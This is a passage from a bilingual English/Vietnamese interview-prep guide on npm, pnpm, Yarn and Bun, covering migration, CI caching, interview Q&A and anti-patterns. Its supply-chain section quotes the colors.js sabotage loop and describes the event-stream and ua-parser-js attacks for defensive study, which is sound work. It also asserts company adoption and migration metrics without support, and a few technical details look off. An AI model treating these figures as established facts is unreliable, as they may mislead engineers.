diff imported_packages.txt declared_packages.txt  # Phantom deps = in imported but not declared

# Step 6: Fix phantom deps (add them explicitly)
pnpm add postcss autoprefixer  # Example: packages used but not declared

# Step 7: Handle peer dep conflicts
pnpm install --strict-peer-dependencies
# → Shows all peer dep issues clearly
# → Fix each one: either upgrade, downgrade, or add to peerDependenciesMeta.optional

# Step 8: Update CI configuration
# Before (npm):
- run: npm ci
# After (pnpm):
- run: pnpm install --frozen-lockfile

# Step 9: Remove old lockfile + update .gitignore
rm package-lock.json
echo "node_modules" >> .gitignore  # Already there, but verify
git add pnpm-lock.yaml pnpm-workspace.yaml .npmrc
```

### Breaking Changes You'll Discover / Những Thứ Sẽ Vỡ

```
1. Phantom dependencies (most common)
   Error: Cannot find module 'lodash' (was hoisted from dependency)
   Fix: pnpm add lodash

2. Bin executables not found
   Error: cross-env: command not found
   Reason: pnpm doesn't hoist .bin/ by default for some configs
   Fix: pnpm add -D cross-env (declare explicitly)

3. Postinstall scripts blocked
   Error: postinstall failed (husky, prisma generate, etc.)
   Reason: pnpm's sandbox blocks some scripts by default
   Fix: .npmrc: enable-pre-post-scripts=true
   OR: pnpm approve-builds (pnpm v9+ interactive approval)

4. Workspace protocol in published packages
   Error: workspace:* not resolved in published package
   Fix: pnpm publish automatically replaces workspace:* with real version
   But: Verify with `pnpm pack` before publishing

5. --filter syntax change
   npm workspaces: --workspace=packages/ui
   pnpm:          --filter @myapp/ui
   Rush:          --to @myapp/ui (topological)

6. .npmrc inheritance
   pnpm reads .npmrc from workspace root AND each package
   Conflicts can cause unexpected behavior
   Fix: Document which .npmrc settings live where

7. node-gyp / native module rebuild
   pnpm store uses hardlinks → shared files across projects
   Some native modules detect they need rebuild
   Fix: pnpm rebuild (in project, after pnpm install)
```

---

## Part 10: Bun — The New Contender / Bun — Đối Thủ Mới

### Bun's Architecture Advantage

```
Bun is NOT just a package manager — it's:
  - JavaScript runtime (replaces Node.js)
  - Package manager (replaces npm/yarn/pnpm)
  - Bundler (replaces webpack/esbuild)
  - Test runner (replaces Jest/Vitest)

Why is Bun's install so fast?

1. Written in Zig (systems language, like Rust — zero GC overhead)
2. Native HTTP client (no Node.js http module overhead)
3. Binary lockfile (bun.lockb) — faster parse than JSON/YAML/DSL
4. Parallel resolution + download (not limited by Node.js event loop)
5. Hardlinks similar to pnpm (disk efficiency)

Speed comparison (react + next.js, fresh install):
  npm install:   ~35 seconds
  pnpm install:  ~18 seconds
  yarn install:  ~25 seconds
  bun install:   ~3.5 seconds  ← 10× faster than npm
  bun install:   ~0.8 seconds  ← with cache (30× faster!)
```

```bash
# Bun usage
bun install                    # Install from bun.lockb (or package.json)
bun add react                  # Add dependency
bun remove lodash              # Remove dependency
bun update                     # Update all deps
bun install --frozen-lockfile  # CI mode (fail if lockfile changed)

# Bun lockfile is BINARY (bun.lockb)
# This is a deliberate choice — faster to parse
# But: not human-readable (can't resolve merge conflicts manually)
# Solution: bun install generates package.json diff you can read

# Running Node.js scripts with Bun:
bun run src/index.ts   # Direct TS execution (no tsc needed)
bun test               # Test runner (Jest-compatible API)
bun build src/index.ts --outdir dist  # Bundler

# Bun compatibility:
# ✅ Most npm packages work (Node.js API compatibility layer)
# ❌ Some native addons: partial support
# ❌ Some Node.js APIs: crypto, cluster not fully implemented
# ❌ pnpm's strict isolation: Bun uses flat layout (phantom deps possible)

# Real adoption 2024:
# ✅ Startups: dev environment speed wins
# ✅ CI: bun install + bun test = fast pipelines
# 🟡 Production runtime: growing (Bun server API promising)
# ❌ Large enterprises: not yet — ecosystem compatibility gaps
```

---

## Part 11: CI Cache Strategies / CI Cache

### GitHub Actions Cache Matrix

```yaml
# .github/workflows/ci.yml

name: CI
on: [push, pull_request]

jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Strategy 1: pnpm (recommended for monorepos)
      - uses: pnpm/action-setup@v4
        with:
          version: 9

      - uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "pnpm" # Built-in cache support

      - name: Get pnpm store directory
        shell: bash
        run: echo "STORE_PATH=$(pnpm store path --silent)" >> $GITHUB_ENV

      - uses: actions/cache@v4
        name: Setup pnpm cache
        with:
          path: ${{ env.STORE_PATH }}
          # KEY DESIGN: lockfile hash + node version + OS
          key: ${{ runner.os }}-node20-pnpm-${{ hashFiles('**/pnpm-lock.yaml') }}
          restore-keys: |
            ${{ runner.os }}-node20-pnpm-

      - name: Install dependencies
        run: pnpm install --frozen-lockfile

  # Strategy 2: npm (simpler projects)
  install-npm:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm" # Caches ~/.npm
      - run: npm ci # MUST use ci not install

  # Strategy 3: Bun (fastest possible)
  install-bun:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - uses: actions/cache@v4
        with:
          path: ~/.bun/install/cache
          key: ${{ runner.os }}-bun-${{ hashFiles('**/bun.lockb') }}
      - run: bun install --frozen-lockfile
```

### Cache Key Design Principles / Thiết Kế Cache Key

```
Cache key = OS + NodeVersion + LockfileHash

Why OS? node_modules contains platform-specific binaries
  cache hit on linux won't work on darwin → separate keys

Why NodeVersion? Node ABI changes between versions
  native modules compiled for Node 18 ≠ Node 20 compatible

Why LockfileHash? Lockfile encodes exact package graph
  lockfile changes → packages changed → cache bust

Anti-pattern: Cache node_modules directly
  ❌ node_modules is LARGE (hundreds of MB)
  ❌ Symlinks don't survive cache restore correctly
  ❌ Platform binaries may be wrong

  # Wrong:
  - uses: actions/cache@v4
    with:
      path: node_modules          # ← DON'T cache node_modules!
      key: ${{ hashFiles('package-lock.json') }}

  # Right:
  - uses: actions/cache@v4
    with:
      path: ~/.npm               # Cache the DOWNLOAD cache
      key: npm-${{ hashFiles('package-lock.json') }}
  - run: npm ci                  # Reinstall from cache (fast)

Cache hit rate target:
  Feature branch: ~70% hit (PR frequently creates commits)
  Main branch:    ~90% hit (lockfile rarely changes)
  Cache miss: full install → still faster than no cache
```

---

## Part 12: Interview Q&A / Câu Hỏi Phỏng Vấn

---

### 🟢 Q1: Tại sao cùng `package.json` lại cho ra kết quả install khác nhau nếu không có lockfile?

**A:**

`package.json` chứa **semver ranges**, không phải exact versions. `"react": "^18.2.0"` nghĩa là "bất kỳ version nào từ 18.2.0 đến <19.0.0". Registry của npm cập nhật liên tục — React 18.2.0 được publish hôm nay, 18.3.1 được publish tuần sau.

Khi bạn chạy `npm install` mà không có lockfile:

- Alice chạy thứ Hai → get `react@18.3.0` (latest lúc đó)
- Bob chạy thứ Sáu → get `react@18.3.1` (patch release mới)
- CI chạy thứ Bảy → get `react@18.3.1`

Alice's environment khác Bob's và CI → "works on my machine" bug.

Lockfile (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`) **pins exact versions** + integrity hash. Mọi người đều get `18.3.1` — deterministic.

**Semver quick reference:**

- `^18.2.0` → `>=18.2.0 <19.0.0` (minor + patch updates OK)
- `~18.2.0` → `>=18.2.0 <18.3.0` (patch updates only)
- `18.2.0` → only this exact version
- `*` → any version (never use in production)

Vietnamese: `package.json` chứa ranges semver, không phải version cụ thể. Không có lockfile → mỗi lần install có thể get version khác nhau tùy thời điểm. Lockfile pin exact version + integrity hash → deterministic install ở mọi môi trường.

**💡 Interview Signal:**

- ✅ Strong: Explains semver range semantics (^, ~), knows lockfile stores integrity hash, mentions real-world consequence ("works on my machine")
- ❌ Weak: "Because npm updates automatically" — not specific about WHY (semver ranges) and doesn't mention integrity checking

---

### 🟢 Q2: `npm ci` vs `npm install` — khi nào dùng cái nào trong CI?

**A:**

|                            | `npm install`             | `npm ci`                     |
| -------------------------- | ------------------------- | ---------------------------- |
| Reads                      | package.json + lockfile   | Only lockfile                |
| Updates lockfile           | ✅ Yes (if out of sync)   | ❌ Never                     |
| Deletes node_modules first | ❌ No                     | ✅ Yes (clean)               |
| Fails if lockfile missing  | ❌ No (creates it)        | ✅ Yes                       |
| Speed in CI                | 🟡 Slower (resolves deps) | 🟢 Faster (skips resolution) |
| Correct for CI             | ❌ No                     | ✅ Yes                       |

**Rule**: Development → `npm install`. CI/CD → `npm ci`. Always.

**Tại sao `npm install` sai trong CI:**

1. Có thể silently upgrade packages nếu lockfile out of sync
2. Nếu developer forgot to commit updated lockfile → CI và prod chạy different versions
3. `--force` flag override all conflicts without error → **supply-chain risk**

**Equivalents:**

```bash
npm ci                            # npm
yarn install --frozen-lockfile    # Yarn Classic
yarn install --immutable          # Yarn Berry
pnpm install --frozen-lockfile    # pnpm
bun install --frozen-lockfile     # Bun
```

Vietnamese: `npm install` dùng cho development (có thể update lockfile). `npm ci` dùng cho CI/CD — clean install từ lockfile, không bao giờ update, fail nếu lockfile không sync. `npm install` trong CI là anti-pattern — có thể silently thay đổi versions.

**💡 Interview Signal:**

- ✅ Strong: Knows `npm ci` deletes node_modules first (clean install), fails on lockfile mismatch, gives equivalents for other PMs
- ❌ Weak: "ci is faster" — correct but incomplete; missing the determinism/security angle

---

### 🟡 Q3: Flat layout (npm/Yarn) vs symlink layout (pnpm) — disk space, performance, correctness?

**A:**

**Flat hoisting (npm 3+, Yarn Classic):**

- All packages hoisted to `node_modules/` root
- ✅ Fast `require()` — Node traverses 1 directory level instead of many nested
- ✅ Simpler mental model
- ❌ Phantom dependencies: packages not in your `package.json` accessible via hoisting
- ❌ Disk: every project has full copy of all packages
- ❌ Correctness: two packages needing different versions of same dep can cause subtle bugs

**Symlink isolation (pnpm):**

- Root `node_modules/` contains only symlinks to `.pnpm/` virtual store
- `.pnpm/` contains actual package files, hardlinked from `~/.pnpm-store`
- ✅ No phantom deps: `require('lodash')` fails if lodash not in your `package.json`
- ✅ Disk: global store + hardlinks → each file on disk only once across all projects
- ✅ Correctness: each package only sees its own declared dependencies
- 🟡 Performance: symlink traversal adds tiny overhead (microseconds, negligible)
- ❌ Tool compatibility: some older tools don't follow symlinks correctly

**Numbers (typical monorepo, 50 packages):**

```
npm:  node_modules = 800MB (each project)
pnpm: node_modules = 50MB (symlinks) + ~/.pnpm-store = 300MB (shared)
      → 6 projects: npm=4.8GB | pnpm=300MB + 6×50MB = 600MB
      → 8× disk savings at scale
```

Vietnamese: Flat hoisting (npm) đơn giản nhưng gây phantom deps. pnpm symlink layout ngăn phantom deps và tiết kiệm disk 60–80% nhờ hardlinks vào global content-addressable store. Khi migrate sang pnpm: sẽ phát hiện phantom deps — đây là điều TỐT (bugs tiềm ẩn được expose).

**💡 Interview Signal:**

- ✅ Strong: Explains phantom dep risk with flat hoisting, gives disk savings numbers, knows pnpm uses hardlinks (not just symlinks), mentions tool compatibility caveat
- ❌ Weak: "pnpm uses symlinks, npm doesn't" — misses the content-addressable store and phantom dep implications

---

### 🟡 Q4: Phantom dependencies — what they are, how pnpm prevents them, refactor pain when migrating?

**A:**

**Phantom dependency**: a package you `import` in your code that is NOT listed in your `package.json` — it exists in `node_modules/` only because some other package depends on it and npm hoisted it to root.

```typescript
// Your code (bad):
import _ from "lodash"; // Works! But lodash is NOT in your package.json

// Why it works (npm flat hoisting):
// your-package depends on some-library
// some-library depends on lodash@4.17.21
// npm hoists lodash to root → node_modules/lodash/ exists
// Your code can import it → no error

// When it breaks:
// You remove some-library → lodash disappears → YOUR code breaks
// You upgrade some-library → it uses lodash@5 (API changed) → YOUR code breaks
```

**How pnpm prevents it:**
pnpm's virtual store means only packages in YOUR `package.json` have root-level symlinks. `node_modules/lodash` does NOT exist unless you declared it. Importing phantom deps = `Cannot find module 'lodash'` error at install time.

**Migration pain (real Grab experience):**

```bash
# What you find when migrating 200-package monorepo to pnpm:
npm → pnpm migration steps:
1. pnpm import (generate pnpm-lock.yaml)
2. pnpm install → FAILS on ~47 phantom deps
3. For each error:
   a. pnpm add <package>        # Add to dependencies
   b. Or: remove the phantom import and use the actual declared dep
4. Repeat until clean install
5. Total time: 2-3 engineering days for large codebase
```

Vietnamese: Phantom dependency là package bạn import nhưng không khai báo trong `package.json`. npm/Yarn hoist deps lên root nên import này works — nhưng fragile. pnpm ngăn bằng cách chỉ tạo symlink ở root cho packages bạn khai báo. Khi migrate sang pnpm: phát hiện và fix phantom deps — pain ngắn hạn, correctness dài hạn.

**💡 Interview Signal:**

- ✅ Strong: Gives concrete code example, explains WHY it happens (hoisting), explains HOW pnpm prevents it (symlinks only for declared), mentions real migration cost
- ❌ Weak: "Phantom deps are packages not in package.json" — correct definition but no mechanism or migration context

---

### 🟡 Q5: Peer dependencies — semantics, `peerDependenciesMeta.optional`, auto-install in npm 7+?

**A:**

**Peer dependencies** = "I need THIS library to be present in the HOST application, not bundled in me."

**Why they exist**: If `react-query` bundled its own copy of React, an app using both would have 2 React instances → React hooks would throw "Invalid hook call" because hooks check identity of React's internal context.

```json
// react-query/package.json
{
  "peerDependencies": {
    "react": "^17.0.0 || ^18.0.0"
  },
  "peerDependenciesMeta": {
    "react": { "optional": false }  // required — app MUST provide React
  }
}

// Example with optional peer dep (MUI):
{
  "peerDependencies": {
    "@emotion/react": "^11",
    "@emotion/styled": "^11"
  },
  "peerDependenciesMeta": {
    "@emotion/react": { "optional": true },   // MUI works without emotion
    "@emotion/styled": { "optional": true }   // (uses CSS-in-JS alternative)
  }
}
```

**npm version behavior:**

- `npm < 7`: Peer deps are just warnings — NOT installed automatically
- `npm >= 7`: Peer deps auto-installed if compatible version not present
- `npm >= 7` with conflict: fails unless `--legacy-peer-deps` (dangerous!)

**pnpm behavior:**

```bash
# .npmrc:
auto-install-peers=true        # Install peer deps automatically
strict-peer-dependencies=true  # Fail on peer conflicts (recommended)

# Check peer deps:
pnpm ls --depth=1              # See what's installed
pnpm why react                 # Show why react is in the tree
```

Vietnamese: Peer deps là "package bạn cần HOST app cung cấp, không phải tôi bundle". Dùng cho: libraries sharing React/Vue instance với host app. npm v7+ auto-install; pnpm cần `auto-install-peers=true`. `optional: true` trong `peerDependenciesMeta` = library vẫn hoạt động không có package đó.

**💡 Interview Signal:**

- ✅ Strong: Explains "2 React instances" problem, knows npm v7 changed behavior, knows `peerDependenciesMeta.optional`, gives MUI as real example
- ❌ Weak: "Peer deps are packages the user must install" — technically correct but misses the WHY (shared singleton requirement)

---

### 🟡 Q6: Lockfile merge conflicts — strategies?

**A:**

Lockfile conflicts happen when 2 branches both modify dependencies. Strategy depends on the package manager:

**npm:**

```bash
# Strategy: Take one side, regenerate
git checkout HEAD -- package-lock.json  # Take main branch version
npm install --package-lock-only          # Update lockfile without installing
# → Adds your branch's packages on top of main's lockfile
```

**pnpm (most reliable):**

```bash
# pnpm has a native merge driver:
# .gitattributes:
pnpm-lock.yaml merge=pnpm-merge

# .git/config (or global gitconfig):
[merge "pnpm-merge"]
  name = pnpm merge driver
  driver = pnpm install --lockfile-only

# Or manual: just regenerate
git checkout HEAD -- pnpm-lock.yaml
pnpm install --lockfile-only  # Merges your package.json additions
```

**Yarn Classic:**

```bash
# yarn.lock format is designed for textual merge
# Often can be auto-resolved (non-conflicting additions)
# When conflict: delete and regenerate
rm yarn.lock
yarn install  # Regenerates — may upgrade some packages
# Risk: other packages may move to newer patch versions

# Better: yarn-deduplicate after merge
npx yarn-deduplicate yarn.lock  # Remove duplicate resolutions
```

**Yarn Berry:**

```bash
# Same as Classic but stricter:
rm yarn.lock
yarn install
# .pnp.cjs will be regenerated too
```

**Prevention (best strategy):**

```
1. Never modify dependencies in long-lived feature branches
2. Rebase frequently (pull main often → integrate lockfile changes early)
3. Use renovate/dependabot for dep updates (dedicated PRs, not mixed with features)
4. Team agreement: always merge lockfile updates FIRST before feature branches
```

Vietnamese: Lockfile conflicts xảy ra khi 2 branch cùng thêm packages. pnpm có native merge driver (tốt nhất). npm: take one side, regenerate với `--package-lock-only`. Yarn: xóa và regenerate (risk: minor version bumps). Prevention tốt nhất: rebase sớm và thường xuyên, dùng Renovate cho dep updates riêng biệt.

**💡 Interview Signal:**

- ✅ Strong: Knows `--package-lock-only` flag (doesn't download, just updates lockfile), mentions pnpm merge driver, prevention strategies
- ❌ Weak: "Delete and reinstall" — works but loses nuance; doesn't mention pnpm driver or prevention

---

### 🔴 Q7: Yarn Berry PnP — `.pnp.cjs`, no `node_modules`, IDE integration, who uses it?

**A:**

**Yarn Berry PnP (Plug'n'Play)** completely replaces the `node_modules` directory with a generated resolver file (`.pnp.cjs`).

**How it works:**

1. Packages stored as `.zip` archives in `.yarn/cache/`
2. `.pnp.cjs` patches Node.js's `require()` / `import()` to redirect to zip paths
3. No file extraction = faster installs, no disk waste

**The real-world tradeoffs:**

```
✅ Benefits:
- Install time: packages are "cached" not extracted → no file I/O overhead
- Zero-installs: commit .yarn/cache → teammates don't even run yarn install
- Strict: phantom deps impossible (PnP rejects unauthorized imports)
- Deduplication: each package version appears once in .yarn/cache/

❌ Pain points:
- TypeScript LSP: must run `yarn dlx @yarnpkg/sdks vscode` to patch TS server
- Jest: needs jest-pnp-resolver
- ESLint: needs @yarnpkg/sdks for ESLint to find plugins
- Native addons: .node files can't live in zips → unplugged workaround
- Debugging: stack traces show zip paths → confusing
- Tooling: any tool that scans node_modules/ blindly fails (husky, semantic-release)
- Commit size: .yarn/cache can be 200-500MB in large projects
```

**Who uses PnP in production:**

- ✅ **Notion** (confirmed in 2022 engineering blog)
- ✅ **Datadog** frontend teams (confirmed at Node.js conferences)
- 🟡 Teams with: dedicated infra engineers, strong tooling ownership, zero-install as priority
- ❌ Most teams: the IDE patching + tool configuration overhead is too high for the benefit

**nodeLinker alternatives (Yarn Berry doesn't force PnP):**

```yaml
# .yarnrc.yml
nodeLinker: pnp           # No node_modules (default Berry)
nodeLinker: node-modules  # Old behavior (flat hoisting) — escape hatch
nodeLinker: pnpm          # pnpm-style symlinks (best of both worlds)
```

Vietnamese: Yarn Berry PnP thay thế `node_modules` bằng file resolver `.pnp.cjs` — packages lưu dưới dạng `.zip`, không extract. Install nhanh hơn, zero phantom deps. Nhưng: TypeScript, Jest, ESLint đều cần patch thủ công. Notion và Datadog dùng trong production, nhưng đa số teams tránh vì friction tooling quá cao. Yarn Berry cho phép `nodeLinker: node-modules` để fallback về behavior cũ.

**💡 Interview Signal:**

- ✅ Strong: Knows the SDK generation step for VSCode, knows `.yarn/cache` contains zips not extracted files, knows `nodeLinker` escape hatch, names Notion as real user
- ❌ Weak: "PnP doesn't have node_modules" — correct but misses tooling consequences and the nodeLinker escape hatch

---

### 🔴 Q8: Supply-chain attacks — event-stream, colors.js, ua-parser-js; defense mechanisms?

**A:**

**Three canonical attacks:**

**event-stream (2018)** — Targeted theft:

- Maintainer transferred ownership to malicious actor
- Attacker added `flatmap-stream` dependency with AES-256 encrypted payload
- Payload activated only inside Copay Bitcoin wallet app → stole private keys
- Lesson: Transitive dependencies are in your attack surface. 2M weekly downloads = huge blast radius.

**colors.js (2022)** — Protest sabotage:

- Marak Squires (maintainer) published infinite loop in v1.4.44
- Protest against corporate free-riding of open source
- `while(true) { console.log('LIBERTY') }` — builds hung globally
- Lesson: Semver caret (`^`) = trust maintainer forever. Lockfile = freezes last known-good version.

**ua-parser-js (2021)** — Account compromise:

- npm account stolen via credential phishing
- Malicious versions published with cryptominer + password stealer
- Affected Facebook, Microsoft, Apple (all used ua-parser-js)
- Lesson: `npm ci` (frozen lockfile) would have protected CI from auto-upgrading

**Defense layers:**

```bash
# Layer 1: Lockfile freeze (most impactful)
npm ci                            # Never upgrades in CI
pnpm install --frozen-lockfile

# Layer 2: npm audit
npm audit                         # Check against npm advisory DB
npm audit --audit-level=critical  # Fail CI only on critical
npm audit fix --dry-run           # Preview fixes

# Layer 3: socket.dev (proactive, beyond CVEs)
# Analyzes: new maintainers, suspicious code patterns, typosquatting
# GitHub App — auto-comments on PRs with new deps
# Used by Vercel, Linear, Stripe

# Layer 4: Dependabot / Renovate (automated PRs)
# Controlled upgrade cadence, human review of each dep update

# Layer 5: npm provenance (2023, Sigstore-based)
# Publishers sign packages with OIDC from GitHub Actions
npm info react dist.attestations
# → Verifiable: source repo + commit hash + CI build that produced it
# Supported by: @angular/core, @aws-sdk, react itself (npm v10.5+)

# Layer 6: Private registry + allowlist (enterprise)
# Only pre-approved packages installable
# New packages go through security review before allowlisting
```

Vietnamese: Ba cuộc tấn công kinh điển: event-stream (2018 — payload ăn cắp Bitcoin wallet), colors.js (2022 — infinite loop phản đối), ua-parser-js (2021 — account bị hack, cài cryptominer). Phòng thủ: (1) lockfile freeze — quan trọng nhất; (2) npm audit; (3) socket.dev — phát hiện patterns đáng ngờ; (4) npm provenance 2023 — package signing qua Sigstore. Đây là những câu hỏi Senior level bắt buộc biết.

**💡 Interview Signal:**

- ✅ Strong: Names specific attacks with dates, explains MECHANISM of each (not just "it was hacked"), knows socket.dev vs npm audit difference, knows npm provenance + Sigstore
- ❌ Weak: "Use npm audit" — necessary but insufficient; misses Sigstore/provenance and socket.dev pattern analysis

---

### 🔴 Q9: Monorepo install at scale — Turbo + pnpm, Nx, Rush; CI cache key strategies?

**A:**

**The core problem at scale:**
200-package monorepo with naive CI:

- Every commit: `npm install` from scratch → 8 minutes
- 20 developers, 10 commits/day → 1,600 minutes/day wasted on install

**Vercel Turborepo + pnpm (recommended 2024):**

```bash
# Setup:
pnpm install --frozen-lockfile

# Turbo pipeline (turbo.json):
{
  "pipeline": {
    "build": { "dependsOn": ["^build"], "outputs": ["dist/**"] },
    "test":  { "dependsOn": ["^build"], "cache": true },
    "lint":  { "cache": true }
  }
}

# Run:
turbo build --filter=@myapp/web   # Build web + its deps only
turbo test --filter=...[HEAD^1]  # Test only packages changed since last commit

# Remote cache (Vercel):
turbo build --token=$TURBO_TOKEN --team=$TURBO_TEAM
# → Artifacts uploaded to Vercel; shared across all CI runners and devs
# → Result: 6min → 45sec (cache hit for unchanged packages)
```

**Microsoft Rush + pnpm:**

```bash
# Rush enforces lockfile consistency:
rush check       # Verify all package.json are consistent
rush install     # Install (pnpm under the hood)
rush build       # Incremental build (tracks input/output fingerprints)
rush change      # Enforce changelog for publishable packages

# Rush's CI cache:
# Uses Azure Blob Storage for build cache
# Cache key: input files hash → output artifact hash
```

**Nx + npm/pnpm:**

```bash
# nx.json:
{
  "tasksRunnerOptions": {
    "default": {
      "runner": "nx/tasks-runners/default",
      "options": {
        "cacheableOperations": ["build", "test", "lint"],
        "remoteCache": { "url": "https://nx-cloud.io" }
      }
    }
  }
}
```

**CI cache key best practices:**

```yaml
# Cache key formula:
key: ${{ runner.os }}-node${{ matrix.node-version }}-${{ hashFiles('**/pnpm-lock.yaml') }}

# Why each component:
# runner.os:         linux vs darwin binaries differ (native modules)
# node-version:      Node ABI changes between major versions
# lockfile hash:     exact dependency graph → any dep change = cache bust

# Restore keys (partial match):
restore-keys: |
  ${{ runner.os }}-node20-pnpm-    # ← will match older lockfile cache
  ${{ runner.os }}-node20-         # ← will match any node20 pnpm cache

# Split cache for parallel jobs:
# Job 1: pnpm store cache (downloaded tarballs) → slow to bust
# Job 2: turbo cache (build artifacts) → fast to bust on code changes
```

Vietnamese: Monorepo 200 packages cần: (1) pnpm workspaces (disk savings + strict isolation); (2) Turborepo remote cache (share artifacts giữa CI runners); (3) Cache key design đúng: OS + NodeVersion + LockfileHash. Vercel Turbo giảm CI time từ 6min → 45sec. Microsoft Rush là enterprise solution cho 500+ packages với audit trail.

**💡 Interview Signal:**

- ✅ Strong: Explains remote cache concept (Turbo uploads artifacts), knows `--filter=...[HEAD^1]` (only changed packages), explains cache key component rationale (OS for native modules)
- ❌ Weak: "Use CI cache for node_modules" — misses the crucial distinction between download cache vs artifact cache, and why node_modules itself shouldn't be cached

---

### 🔴 Q10: Migrating 200-package monorepo from npm to pnpm — breaking changes you'll discover?

**A:**

**Systematic migration approach:**

```bash
# Phase 1: Generate pnpm lockfile (no install yet)
pnpm import  # reads package-lock.json → pnpm-lock.yaml

# Phase 2: First install (discover breaking changes)
pnpm install
# This WILL fail on most large codebases
```

**Breaking changes in order of frequency:**

**1. Phantom dependencies (most common — ~80% of projects)**

```
Error: Cannot find module 'postcss'
Cause: postcss was hoisted by npm but not in your package.json
Fix: pnpm add postcss (or pnpm add -D postcss for dev dep)
Scale: Grab found 47 phantom deps in 200-package monorepo
Time: 2-3 engineering days to identify and fix all
```

**2. strict-peer-dependencies failures**

```bash
# pnpm shows peer dep issues npm silently ignored:
 WARN  unmet peer react@"^16" from react-beautiful-dnd@13.1.1
# npm: warning (ignored by most)
# pnpm: fails install with strict-peer-dependencies=true

# Fix options:
# a) Add peerDependencyRules to package.json:
{
  "pnpm": {
    "peerDependencyRules": {
      "allowedVersions": { "react-beautiful-dnd>react": "18" }
    }
  }
}
# b) Upgrade the package to peer-compatible version
# c) Use --no-strict-peer-dependencies (temporary escape hatch)
```

**3. public-hoist-pattern for tooling**

```bash
# Some tools (ESLint, Jest binaries) must be at root node_modules/.bin/
# pnpm doesn't hoist by default
# .npmrc:
public-hoist-pattern[]=*eslint*
public-hoist-pattern[]=*prettier*
public-hoist-pattern[]=*jest*
public-hoist-pattern[]=*babel*
public-hoist-pattern[]=*@types/*
```

**4. postinstall scripts**

```bash
# pnpm v9 requires approval for postinstall scripts by default:
pnpm approve-builds  # Interactive: approve/deny each package's scripts
# Or: .npmrc:
enable-pre-post-scripts=true  # Allow all (less secure)
```

**5. workspace protocol**

```bash
# Replace: "packages/ui": "file:../../packages/ui"
# With:    "@myapp/ui": "workspace:*"
# pnpm publishes with correct version, npm file: doesn't resolve well
```

**Post-migration gains (Grab-reported):**

```
- node_modules size: 3.2GB → 800MB (75% reduction via hardlinks)
- CI install time: 4.5min → 1.8min (faster due to hardlinks + parallel)
- Phantom dep bugs: 3 production incidents → 0 (strict isolation)
- Developer experience: disk space freed on MacBooks (significant!)
```

Vietnamese: Migration 200-package monorepo: (1) `pnpm import` tạo lockfile. (2) Fix phantom deps (nhiều nhất, 2–3 ngày). (3) Fix peer dep conflicts mà npm silently ignore. (4) Configure `public-hoist-pattern` cho tooling binaries. (5) Approve postinstall scripts. Sau migration: disk giảm 75%, CI nhanh hơn, phantom dep bugs biến mất.

**💡 Interview Signal:**

- ✅ Strong: Quantifies the migration effort (2-3 days), knows `public-hoist-pattern` specifically, mentions `peerDependencyRules` as pnpm-specific config, gives real post-migration metrics
- ❌ Weak: "Just run pnpm import" — misses the systematic fixing process and all the breaking changes

---

## Anti-Patterns / Các Anti-Pattern

---

### ❌ Anti-Pattern 1: Committing `node_modules` to Git

```bash
# Wrong:
git add node_modules/  # Never do this

# Problems:
# - Repo size: typical Next.js app node_modules = 200-800MB
# - Platform-specific binaries: .node files built for your OS, break on Linux CI
# - Symlinks (pnpm): don't survive git clone correctly on Windows
# - Diff noise: every dependency update = thousands of changed files
# - Lockfile defeats the purpose: if you commit node_modules, lockfile redundant

# Correct .gitignore:
node_modules/
.pnp.cjs         # ← NO! This SHOULD be committed for Yarn PnP
.pnp.loader.mjs  # ← Commit this too for PnP

# The ONE exception: Yarn Berry "zero-installs"
# - Commit .yarn/cache/ (zip archives, cross-platform safe)
# - Don't commit node_modules
# - Teammates: yarn install = instant (already cached)
# - Tradeoff: repo grows by 100-500MB

# What to commit:
✅ package.json
✅ package-lock.json / yarn.lock / pnpm-lock.yaml / bun.lockb
✅ .npmrc / .yarnrc.yml
❌ node_modules/
```

---

### ❌ Anti-Pattern 2: `npm install --force` in CI

```bash
# Wrong:
- run: npm install --force   # NEVER in CI

# What --force does:
# - Overrides peer dependency conflicts (silently)
# - Ignores lockfile (installs different versions)
# - Forces reinstall of cached packages
# - Can install incompatible package combinations without error

# Real failure mode:
# react@18 + react-dom@17 installed by --force
# → App builds but crashes at runtime with cryptic hook errors
# → Hard to debug because no install-time error

# Also wrong:
- run: npm install --legacy-peer-deps   # Silently ignores peer deps
# → Same problem: incompatible packages installed, runtime crash

# Correct:
- run: npm ci                           # Frozen lockfile, clean install
# If peer dep conflicts: FIX them in package.json, don't bypass

# pnpm equivalent wrong:
- run: pnpm install --no-strict-peer-dependencies  # Don't suppress errors
```

---

### ❌ Anti-Pattern 3: Wildcard `"*"` in Dependencies

```json
// Wrong:
{
  "dependencies": {
    "react": "*",          // Any version ever published
    "lodash": "latest",    // "latest" tag — changes without notice
    "axios": ">=0.1.0"    // Too broad — includes pre-releases, majors
  }
}

// What breaks:
// react: "*" → react@19.0.0-beta.1 published → auto-install → your hooks break
// lodash: "latest" → v5 (if published, breaking API changes) → runtime errors
// Impossible to reproduce bugs ("worked yesterday")

// Even with lockfile, this is dangerous:
// Lockfile pins current, but `npm update` or Renovate PRs will always take latest
// Communicates "no opinion on version" to everyone reading package.json

// Correct:
{
  "dependencies": {
    "react": "^18.2.0",     // Allow patch + minor within 18.x
    "lodash": "~4.17.21",   // Allow patch only within 4.17.x
    "axios": "^1.6.0"       // Explicit minimum with caret
  }
}

// For internal packages in monorepo: workspace:* is fine (different semantics)
{
  "dependencies": {
    "@myapp/ui": "workspace:*"  // ✅ OK — means "local workspace version"
  }
}
```

---

### ❌ Anti-Pattern 4: Editing Files Inside `node_modules`

```bash
# Wrong:
vim node_modules/some-library/dist/index.js  # Direct edit

# Why this fails:
# 1. Any `npm install` / `pnpm install` overwrites your changes
# 2. No record of what changed or why
# 3. CI doesn't have your changes (node_modules not in git)
# 4. Other developers don't have your changes
# 5. pnpm hardlinks: editing hardlinked file may affect OTHER projects!

# Correct approach: patch-package (npm/yarn)
npm install patch-package
# Edit node_modules/some-library/dist/index.js
npx patch-package some-library
# → Creates patches/some-library+1.2.3.patch
# → Commit the patch file to git
# → package.json postinstall:
{
  "scripts": {
    "postinstall": "patch-package"
  }
}

# Correct approach: pnpm patches
pnpm patch some-library@1.2.3
# → Opens temp directory for editing
